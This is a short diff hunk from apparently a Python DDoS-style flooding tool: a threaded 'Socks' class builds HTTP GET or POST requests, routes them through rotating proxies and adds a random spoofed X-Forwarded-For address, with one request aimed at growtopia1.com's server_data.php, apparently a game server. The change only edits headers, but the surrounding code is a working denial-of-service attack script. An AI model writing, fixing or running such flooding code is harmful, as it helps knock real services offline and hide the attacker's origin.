@@ -162,10 +162,10 @@ class Socks(threading.Thread):
         randomip  = str(random.randint(1,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
         forward   = "X-Forwarded-For: " + randomip + "\r\n"
         if method == "1":
-            get_host = "GET / HTTP/1.1\r\nHost: "+ip+":"+str(port)+"\r\n"
+            get_host = "GET / HTTP/1.1\r\nHost: "+ip+":"+str(port)+"\r\nContent-Type: application/json\r\n"
         else:
-            get_host = "POST /growtopia/server_data.php HTTP/1.0\r\nHost: growtopia1.com\r\n"
-        request  = get_host + useragent + accept + "Connection: close\r\nContent-Type: application/x-www-form-urlencoded\r\n" + forward + "\r\n"
+            get_host = "POST /growtopia/server_data.php HTTP/1.0\r\nHost: growtopia1.com\r\nContent-Type: application/x-www-form-urlencoded\r\n"
+        request  = get_host + useragent + accept + "Connection: close\r\nContent-Length: 38\r\n" + forward + "\r\n"
         current = x
         if current < len(proxies):
             proxy = proxies[current].strip().split(':')
